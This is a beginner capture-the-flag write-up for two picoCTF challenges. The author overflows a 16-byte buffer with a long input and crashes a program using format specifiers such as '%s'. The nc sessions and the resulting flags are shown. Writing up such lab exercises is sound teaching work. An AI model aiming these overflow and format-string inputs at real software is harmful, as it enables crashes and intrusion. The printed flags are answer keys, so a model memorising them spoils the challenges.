# Challenge 1 : Buffer overflow 0
>Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:

## Solution :

So first when I tried to connect to the machine it asked me for an input so I just tried hello, which triggered it to exit as shown below : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc saturn.picoctf.net 57507
Input: hello
The program will exit now
```
then i decided to look into the program, which told us that `sigsev_handler`, will print out the flag, but it only get's triggered when there is a segmentation fault, so that's exactly what we are gonna do, I see that `buf2` has a size limit of only 16 characters, so i basically just tried to overflow it, by doing the following : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc saturn.picoctf.net 57507
Input: 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

FudgeSupreme-picoctf@webshell:~$
```
Which just gave me the flag.

## Flag : 
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

# Challenge 2 : format string 0
>Can you use your knowledge of format strings to make the customers happy?
>Download the binary here.
>Download the source here.

## Solution :

This is a pretty easy exploitation if u don't just look at the code file and give up, I didn't do much in this except keep on trying different choices until 1 worked although I did understand a bit later why they worked, but yeah, so here is how u solve this one : 
```shell
FudgeSupreme-picoctf@webshell:~$ nc mimas.picoctf.net 54020
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
So the options : `Gr%114d_Cheese` and `Cla%sic_Che%s%steak` work and u get the flag.

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
